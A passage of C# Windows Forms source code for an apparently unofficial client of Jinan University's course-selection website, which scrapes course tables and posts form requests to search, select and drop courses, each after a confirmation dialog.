                    string courseItem = m.Groups[2].Value.Replace("&nbsp;", "");
                    Match mItem = Regex.Match(courseItem,
                        "<td>(.*?)</td>\\s*" +  // 退课 1
                        "<td>(.*?)</td>\\s*" +  // 排课班号 2
                        "<td>(.*?)</td>\\s*" +  // 课程编号 3
                        "<td>(.*?)</td>\\s*" +  // 课程名称 4
                        "<td>(.*?)</td>\\s*" +  // 学分 5
                        "<td>(.*?)</td>\\s*" +  // 类别 6
                        "<td>(.*?)</td>\\s*" +  // 时间安排 7
                        "<td>(.*?)</td>\\s*" +  // 授课教师 8
                        "<td>(.*?)</td>\\s*" +  // 上课地点 9
                        "<td>(.*?)</td>\\s*" +  // 备注 10
                        "<td>(.*?)</td>\\s*" +  // 修学 11
                        "<td>(.*?)</td>\\s*" +  // 阶段 12
                        "<td>(.*?)</td>");  // 考试时间 13
                    string postPara = Regex.Match(mItem.Groups[1].Value, "__doPostBack\\('(.*?)',''\\)").Groups[1].Value;
                    quitMapping.Add(rows, postPara);
                    rows += 1;
                    mySelectionTable.Rows.Add(new Button(), mItem.Groups[2].Value, mItem.Groups[3].Value,
                        mItem.Groups[4].Value, mItem.Groups[5].Value, mItem.Groups[11].Value.Trim(),
                        mItem.Groups[6].Value.Trim(), mItem.Groups[7].Value, mItem.Groups[8].Value, 
                        mItem.Groups[9].Value, mItem.Groups[10].Value, mItem.Groups[12].Value, mItem.Groups[13].Value);
                }
                lblXf.Text = Regex.Match(mySelectionTablePage, "<span id=\"lblXf\"(.*?)>(.*?)</span>").Groups[2].Value;
            }
        }
        private void LoadMySelectionSpecialItem(string itemName, ComboBox itemCombo) {
            itemCombo.Items.Clear();
            Match mItem = Regex.Match(mySelectionTablePage, "<select(.*?)" + itemName + "(.*?)>([\\s\\S]*?)</select>");
            string opItem = mItem.Groups[3].Value;  // 该组包括换行符，得使用[\s\S]代替.
            MatchCollection iItem = Regex.Matches(opItem, "<option(.*?)value=\"(.*?)\"(.*?)>(.*?)</option>");
            foreach(Match m in iItem) {
                string key = m.Groups[4].Value;
                if(key != " ")
                    itemCombo.Items.Add(key);
                if(m.Value.Contains("selected"))
                    itemCombo.Text = key;
            }
        }
        
        /// <summary>
        ///   Update the selected course page by click the search button
        /// </summary>
        private void UpdateMySelectionTableBySearch() {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_XK_MainCX.aspx", "POST",
                "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_XK_MainCX.aspx");
            /**
             * 这个shabi程序员把btn打成bth害我浪费了一下午的时间查错（2017/2/24 20:14）
             */
            string requestContent = string.Format("__EVENTTARGET=&__EVENTARGUMENT=&{0}&dlstXndZ={1}&dlstNdxq={2}&bthSearch=%B2%E9%D1%AF",
                GetMySelectionRequestBase(mySelectionTablePage), dlstMyXndZ.Text, HttpUtility.UrlEncode(dlstMyNdxq.Text, defaultEncoding));
            PostHttpRequest(requestContent);
            GetHttpResponse(ref mySelectionTablePage);
            
            UpdateMySelectionTable();
        }

        /// <summary>
        ///   Quit a course by course name
        /// </summary>
        private void QuitCourse(DataGridViewRow row) {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx", "POST",
                "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx");
            string requestContent = string.Format("__EVENTTARGET={0}&__EVENTARGUMENT=&{1}",
                quitMapping[row.Index], GetMySelectionRequestBase(mySelectionTablePage));
            PostHttpRequest(requestContent);
            GetHttpResponse(ref tmpPage);

            DialogResult dr = MessageBox.Show("Really want to quit this course?", "QUIT?", MessageBoxButtons.OKCancel);
            if(dr == DialogResult.OK) {
                LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx", "POST",
                    "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx");
                requestContent = string.Format("{0}&txtFkcbh={1}&btnQr=%C8%B7%C8%CF%CD%CB%BF%CE",
                    GetMySelectionRequestBase(tmpPage), row.Cells[2].Value.ToString());
                PostHttpRequest(requestContent);
                GetHttpResponse(ref mySelectionTablePage);

                mySelectionTable.Rows.Clear();
                quitMapping.Clear();
                int rows = 0;
                MatchCollection mc = Regex.Matches(mySelectionTablePage, "<tr class=\"DG(Alternating|Selected)?ItemStyle\">([\\s\\S]*?)</tr>");
                foreach(Match m in mc) {
                    string courseItem = m.Groups[2].Value.Replace("&nbsp;", "");
                    Match mItem = Regex.Match(courseItem,
                        "<td>(.*?)</td>\\s*" +  // 退课 1
                        "<td>(.*?)</td>\\s*" +  // 排课班号 2
                        "<td>(.*?)</td>\\s*" +  // 课程编号 3
                        "<td>(.*?)</td>\\s*" +  // 课程名称 4
                        "<td>(.*?)</td>\\s*" +  // 学分 5
                        "<td>(.*?)</td>\\s*" +  // 类别 6
                        "<td>(.*?)</td>\\s*" +  // 时间安排 7
                        "<td>(.*?)</td>\\s*" +  // 授课教师 8
                        "<td>(.*?)</td>\\s*" +  // 上课地点 9
                        "<td>(.*?)</td>\\s*" +  // 备注 10
                        "<td>(.*?)</td>\\s*" +  // 修学 11
                        "<td>(.*?)</td>\\s*" +  // 阶段 12
                        "<td>(.*?)</td>");  // 考试时间 13
                    string postPara = Regex.Match(mItem.Groups[1].Value, "__doPostBack\\('(.*?)',''\\)").Groups[1].Value;
                    quitMapping.Add(rows, postPara);
                    rows += 1;
                    mySelectionTable.Rows.Add(new Button(), mItem.Groups[2].Value, mItem.Groups[3].Value,
                        mItem.Groups[4].Value, mItem.Groups[5].Value, mItem.Groups[11].Value.Trim(),
                        mItem.Groups[6].Value.Trim(), mItem.Groups[7].Value, mItem.Groups[8].Value,
                        mItem.Groups[9].Value, mItem.Groups[10].Value, mItem.Groups[12].Value, mItem.Groups[13].Value);
                }
                lblXf.Text = Regex.Match(mySelectionTablePage, "<span id=\"lblXf\"(.*?)>(.*?)</span>").Groups[2].Value;
            }
        }
        #endregion

        #region For selection form and table
        /// <summary>
        ///   Load the form used to post selection query information
        /// </summary>
        private void LoadSelectRequestForm() {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx", "POST",
                "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx");
            string requestContent = GetMySelectionRequestBase(mySelectionConfirmPage) + "&btnKkLb=%BF%AA%BF%CE%C1%D0%B1%ED";
            PostHttpRequest(requestContent);
            GetHttpResponse(ref selectFormPage);

            LoadSelectRequestFormItem("dlstSsfw", sdlstSsfw);
            LoadSelectRequestFormItem("dlstXy", sdlstXy);
            LoadSelectRequestFormItem("dlstZy", sdlstZy);
            LoadSelectRequestFormItem("dlstSydx", sdlstSydx);
            LoadSelectRequestFormItem("dlstKclb", sdlstKclb);
            sdlstSsfw.Text = "优先选课";
        }

        /// <summary>
        ///   Update the Select Request form if Xy or Zy is selected
        /// </summary>
        private void UpdateSelectRequestForm() {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx", "POST",
                "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx");
            string requestContent = GetScheduleQueryRequestBase(selectFormPage) + 
                "&" + GetSelectQueryRequestAppend();
            PostHttpRequest(requestContent);
            GetHttpResponse(ref selectFormPage);
        }
        
        /// <summary>
        ///   Load one item to the combo box by parsing cache page
        /// </summary>
        private void LoadSelectRequestFormItem(string itemName, ComboBox itemCombo) {
            itemCombo.Items.Clear();
            Match mItem = Regex.Match(selectFormPage, "<select(.*?)" + itemName + "(.*?)>([\\s\\S]*?)</select>");
            string opItem = mItem.Groups[3].Value;  // 该组包括换行符，得使用[\s\S]代替.
            MatchCollection iItem = Regex.Matches(opItem, "<option(.*?)value=\"(.*?)\"(.*?)>(.*?)</option>");
            foreach(Match m in iItem) {
                string name = m.Groups[4].Value;
                string key = itemName + name;
                if(!selectMapping.ContainsKey(key))
                    selectMapping.Add(key, m.Groups[2].Value);
                itemCombo.Items.Add(name);
            }
        }

        /// <summary>
        ///   Check whether the query item is correctly input.
        /// </summary>
        private bool CheckSelectQueryForm() {
            CheckComboBox check = (c) => {  // 除非有人填错项的位置（假设没有傻逼）
                return selectMapping.ContainsKey(c.Name.Substring(1) + c.Text);
            };
            return check(sdlstSsfw) && check(sdlstXy) && check(sdlstZy) && check(sdlstSydx) && check(sdlstKclb);
        }

        /// <summary>
        ///   Request for the course schedule table
        /// </summary>
        private void SelectQueryRequest() {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx", "POST",
                "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx");
            string requestContent = GetScheduleQueryRequestBase(selectFormPage) +
                "&" + GetSelectQueryRequestAppend() + "&btnSearch=%B2%E9%D1%AF";
            PostHttpRequest(requestContent);
            GetHttpResponse(ref selectTablePage);

            UpdateSelectTable();
            UpdateSelectTableSelections();
        }
        
        /// <summary>
        ///   Returns the selected items as post parameter format
        /// </summary>
        private string GetSelectQueryRequestAppend() {
            string append = "dlstSsfw=" + HttpUtility.UrlEncode(selectMapping["dlstSsfw" + sdlstSsfw.Text], defaultEncoding);
            append += "&dlstKclb=" + selectMapping["dlstKclb" + sdlstKclb.Text];
            append += "&txtXf=" + HttpUtility.UrlEncode(stxtXf.Text, defaultEncoding);
            append += "&dlstXy=" + selectMapping["dlstXy" + sdlstXy.Text];
            append += "&txtKcmc=" + HttpUtility.UrlEncode(stxtKcmc.Text, defaultEncoding);
            append += "&txtNj=" + HttpUtility.UrlEncode(stxtNj.Text, defaultEncoding);
            append += "&dlstZy=" + selectMapping["dlstZy" + sdlstZy.Text];
            append += "&txtKcbh=" + HttpUtility.UrlEncode(stxtKcbh.Text, defaultEncoding);
            append += "&txtSkDz=" + HttpUtility.UrlEncode(stxtSkDz.Text, defaultEncoding);
            if(sdlstSydx.Text == "")     // special case (fuck you)
                append += "&dlstSydx=4";
            else
                append += "&dlstSydx=" + selectMapping["dlstSydx" + sdlstSydx.Text];
            append += "&txtPkbh=" + HttpUtility.UrlEncode(stxtPkbh.Text, defaultEncoding);
            append += "&txtBzxx=";
            append += "&txtZjjs=" + HttpUtility.UrlEncode(stxtZjjs.Text, defaultEncoding);
            return append;
        }
        
        /// <summary>
        ///   Update the select table with course information
        /// </summary>
        private void UpdateSelectTable() {
            selectTable.Rows.Clear();
            enterMapping.Clear();
            int rows = 0;
            MatchCollection mc = Regex.Matches(selectTablePage, "<tr class=\"DG(Alternating|Selected)?ItemStyle\">([\\s\\S]*?)</tr>");
            foreach(Match m in mc) {
                string courseItem = m.Groups[2].Value.Replace("&nbsp;", "");
                Match mItem = Regex.Match(courseItem,
                    "<td>(.*?)</td>\\s*" +  // 选课 1
                    "<td>(.*?)</td>\\s*" +  // 排课班号 2
                    "<td>(.*?)</td>\\s*" +  // 课程编号 3
                    "<td>(.*?)</td>\\s*" +  // 课程名称 4
                    "<td>(.*?)</td>\\s*" +  // 学分 5
                    "<td>(.*?)</td>\\s*" +  // 类别 6
                    "<td>(.*?)</td>\\s*" +  // 时间安排 7
                    "<td>(.*?)</td>\\s*" +  // 授课教师 8
                    "<td>(.*?)</td>\\s*" +  // 上课地点 9
                    "<td>(.*?)</td>\\s*" +  // 备注 10
                    "<td>(.*?)</td>\\s*" +  // 容量 11
                    "<td>(.*?)</td>\\s*" +  // 已选 12
                    "<td>(.*?)</td>\\s*" +  // 考试时间 13
                    "<td>(.*?)</td>");  // 语言 14
                string postPara = Regex.Match(mItem.Groups[1].Value, "__doPostBack\\('(.*?)',''\\)").Groups[1].Value;
                
                enterMapping.Add(rows, postPara);
                rows += 1;

                selectTable.Rows.Add(new Button(), mItem.Groups[2].Value, mItem.Groups[3].Value,
                    mItem.Groups[4].Value.Trim(), mItem.Groups[5].Value, mItem.Groups[6].Value, mItem.Groups[7].Value,
                    mItem.Groups[8].Value, mItem.Groups[9].Value, mItem.Groups[10].Value, mItem.Groups[11].Value,
                    mItem.Groups[12].Value, mItem.Groups[13].Value, mItem.Groups[14].Value);
            }
        }
        /// <summary>
        ///   Update the button, combobox and label
        /// </summary>
        private void UpdateSelectTableSelections(){
            stxtRows.Text = Regex.Match(selectTablePage, "<input(.*?)txtRows(.*?)value=\"(.*?)\"(.*?)/>").Groups[3].Value;
            snowRows = stxtRows.Text;
            slblRowPages.Text = Regex.Match(selectTablePage, "<span id=\"lblRowPages\">(.*?)</span>").Groups[1].Value;
            sdlstPage.Items.Clear();
            int totalPages = Int32.Parse(Regex.Match(slblRowPages.Text, "\\d+").Groups[0].Value);
            if(totalPages == 0)
                totalPages = 1;
            for(int i = 1; i <= totalPages; i++)
                sdlstPage.Items.Add(i);
            sdlstPage.Text = Regex.Match(selectTablePage, "<option selected=\"selected\" value=\"(.*?)\">").Groups[1].Value;
            snowPage = dlstPage.Text;
        }
        
        /// <summary>
        ///   Update select table by the item selections in panel2
        /// </summary>
        private void UpdateSelectTableBySelections(string eventTarget) {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx", "POST",
                "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx");
            string requestContent = GetScheduleQueryRequestBase(selectTablePage)
                .Replace("__EVENTTARGET=", "__EVENTTARGET=" + eventTarget) +
                string.Format("&txtRows={0}&dlstPage={1}", stxtRows.Text, sdlstPage.Text);
            PostHttpRequest(requestContent);
            GetHttpResponse(ref selectTablePage);

            UpdateSelectTable();
            UpdateSelectTableSelections();
        }
        /// <summary>
        ///   Update table by left or right arrows
        /// </summary>
        private void UpdateSelectTableByArrows(string btn) {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx", "POST",
                "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx");
            string requestContent = GetScheduleQueryRequestBase(selectTablePage) +
                string.Format("&txtRows={0}&" + GetButtonParameter(btn) + "&dlstPage={1}", stxtRows.Text, sdlstPage.Text);
            PostHttpRequest(requestContent);
            GetHttpResponse(ref selectTablePage);
            
            UpdateSelectTable();
            UpdateSelectTableSelections();
        }
        
        /// <summary>
        ///   Select a course.
        /// </summary>
        private void SelectCourse(DataGridViewRow row) {
            LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx", "POST",
                "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx");
            string requestContent = string.Format(
                "__EVENTTARGET={0}&__EVENTARGUMENT=&__LASTFOCUS=&{1}&txtRows={2}&dlstPage={3}",
                enterMapping[row.Index], GetMySelectionRequestBase(selectTablePage), stxtRows.Text, sdlstPage.Text);
            PostHttpRequest(requestContent);
            GetHttpResponse(ref tmpPage);

            DialogResult dr = MessageBox.Show("Really want to select this course?", "SELECT?", MessageBoxButtons.OKCancel);
            if(dr == DialogResult.OK) {
                LoadHttpRequest("/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx", "POST",
                    "http://jwxt.jnu.edu.cn/Secure/PaiKeXuanKe/wfrm_XK_XuanKe.aspx");
                requestContent = string.Format("{0}&txtFkcbh={1}&btnQr=%C8%B7%C8%CF%D1%A1%BF%CE",
                    GetMySelectionRequestBase(tmpPage), row.Cells[2].Value.ToString());
                PostHttpRequest(requestContent);
                GetHttpResponse(ref tmpPage);

                if(tmpPage.Contains("alert")) {
                    Match mError = Regex.Match(tmpPage, "alert\\('(.*)'\\);//");
                    string Error = mError.Groups[1].Value.ToString();
                    MessageBox.Show(Error, "ERROR", MessageBoxButtons.OK,
                        MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
                }
                else {
                    selectTablePage = tmpPage;
                    selectTable.Rows.Clear();
                    enterMapping.Clear();
                    int rows = 0;
                    MatchCollection mc = Regex.Matches(selectTablePage, "<tr class=\"DG(Alternating|Selected)?ItemStyle\">([\\s\\S]*?)</tr>");
                    foreach(Match m in mc) {
                        string courseItem = m.Groups[2].Value.Replace("&nbsp;", "");
                        Match mItem = Regex.Match(courseItem,
                            "<td>(.*?)</td>\\s*" +  // 选课 1
                            "<td>(.*?)</td>\\s*" +  // 排课班号 2
                            "<td>(.*?)</td>\\s*" +  // 课程编号 3
                            "<td>(.*?)</td>\\s*" +  // 课程名称 4
                            "<td>(.*?)</td>\\s*" +  // 学分 5
                            "<td>(.*?)</td>\\s*" +  // 类别 6
                            "<td>(.*?)</td>\\s*" +  // 时间安排 7
                            "<td>(.*?)</td>\\s*" +  // 授课教师 8
                            "<td>(.*?)</td>\\s*" +  // 上课地点 9
                            "<td>(.*?)</td>\\s*" +  // 备注 10
                            "<td>(.*?)</td>\\s*" +  // 容量 11
                            "<td>(.*?)</td>\\s*" +  // 已选 12
                            "<td>(.*?)</td>\\s*" +  // 考试时间 13
                            "<td>(.*?)</td>");  // 语言 14
                        string postPara = Regex.Match(mItem.Groups[1].Value, "__doPostBack\\('(.*?)',''\\)").Groups[1].Value;

                        enterMapping.Add(rows, postPara);
                        rows += 1;

                        selectTable.Rows.Add(new Button(), mItem.Groups[2].Value, mItem.Groups[3].Value,
                            mItem.Groups[4].Value.Trim(), mItem.Groups[5].Value, mItem.Groups[6].Value, mItem.Groups[7].Value,
                            mItem.Groups[8].Value, mItem.Groups[9].Value, mItem.Groups[10].Value, mItem.Groups[11].Value,
                            mItem.Groups[12].Value, mItem.Groups[13].Value, mItem.Groups[14].Value);
                    }
                }
            }
        }
        #endregion

        private void WriteToFile(string fileName, string content) {
            using(FileStream fs = new FileStream(fileName, FileMode.Create, FileAccess.Write)) {
                StreamWriter writer = new StreamWriter(fs, Encoding.UTF8);
                writer.Write(content);
                writer.Close();
            }
        }

		private void refresh1_Click(object sender, EventArgs e) {
			try {
				LoadScheduleRequestForm();
			} catch (WebException) {
				MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
					MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
			}
		}

		private void refresh2_Click(object sender, EventArgs e) {
			try {
				LoadMySelectionTable(false);
				if (mySelectionPanel.Visible == false)   // 如果是选课时间
					LoadSelectRequestForm();
			} catch (WebException) {
				MessageBox.Show(netError, "ERROR", MessageBoxButtons.OK,
					MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);
			}
		}
	}
}
